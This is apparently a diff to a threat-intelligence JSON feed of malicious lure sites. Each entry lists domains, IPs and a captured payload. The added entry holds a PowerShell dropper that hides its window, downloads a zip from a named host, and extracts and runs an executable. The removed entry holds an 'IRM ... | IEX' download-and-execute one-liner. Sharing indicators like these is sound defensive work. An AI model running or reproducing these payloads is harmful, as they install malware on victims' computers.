@@ -1,5 +1,24 @@
 [
   {
+    "UrlDomain": "canakkaleweb-tasarim.cyou",
+    "DeliveryUrl": [
+      "friendsoftorreabbey.com"
+    ],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "172.67.147.92"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Franz.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"G4spHKbT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmww9msi40h9z0nmltnw91xnl",
+    "ScannedAt": "2026-11-25T15:15:42.220000+00:00"
+  },
+  {
     "UrlDomain": "sandyshoresafricasafaris.com",
     "DeliveryUrl": [
       "friendsoftorreabbey.com"
@@ -10410,25 +10429,5 @@
     ],
     "ReportId": "cmwkv9kms1g1g0omljms1lzaw",
     "ScannedAt": "2026-11-17T15:48:02.874000+00:00"
-  },
-  {
-    "UrlDomain": "csogrant.bt",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "160.236.194.19"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
-    ],
-    "ReportId": "cmwktvio01fxo0omlc5hd3w8p",
-    "ScannedAt": "2026-11-17T15:09:07.568000+00:00"
   }
 ]
